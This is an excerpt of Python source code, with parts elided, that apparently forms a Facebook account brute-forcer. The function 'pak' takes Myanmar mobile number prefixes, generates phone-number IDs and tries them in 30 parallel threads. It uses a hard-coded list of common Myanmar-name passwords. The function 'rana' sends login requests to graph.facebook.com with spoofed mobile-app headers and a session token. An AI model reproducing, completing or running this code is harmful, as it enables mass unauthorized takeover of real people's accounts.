    ...
    def rana(user):
        ...
        for px in pp:
          ...
          #  print (ua)
            ...
            header = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; ; CJPMS_AAPC3633A9F3F7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36", "Content-Type": "application/x-www-form-urlencoded", "Host": "graph.facebook.com", "X-FB-Net-HNI": "22739", "X-FB-SIM-HNI": "35221", "X-FB-Connection-Type": "MOBILE.LTE", "X-Tigon-Is-Retry": "False", "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62", "x-fb-device-group": "5120", "X-FB-Friendly-Name": "ViewerReactionsMutation", "X-FB-Request-Analytics-Tags": "graphservice", "X-FB-HTTP-Engine": "Liger", "X-FB-Client-IP": "True", "X-FB-Server-Cluster": "True", "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62"}
...
def pak():
                user=[]
                clear()
                print('\033[1;31m Code example: 0940,0945,0942,0979,0977,0978,0976,0975,0925,0988,0989,0981,0969,0968,0960,0965')
                ...
                with tred(max_workers=30) as Aking:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'AungAung','aungaung','aung aung','aungaung123','aungaung1234','aungaung12345','aung123','aung1234','aung12345','Myanmar','myanmar','kyawkyaw','KyawKyaw','kyaw kyaw','aye12345','kyawkyaw123','kyawkyaw1234','kyawkyaw12345','kyaw123','kyaw1234','kyaw12345','zawzaw','ZawZaw','zaw zaw','aye123','zawzaw123','zawzaw1234','zawzaw12345','zaw123','zaw1234','zaw12345','tuntun','TunTun','tun tun','ayeaye12345','tuntun123','tuntun1234','tuntun12345','tun123','tun1234','tun12345','zinzin','ZinZin','zin zin','aye12345','zinzin123','zinzin1234','zinzin12345','zin123','zin1234','zin12345','ayeaye','AyeAye','aye aye','ayeaye123','ayeaye1234']
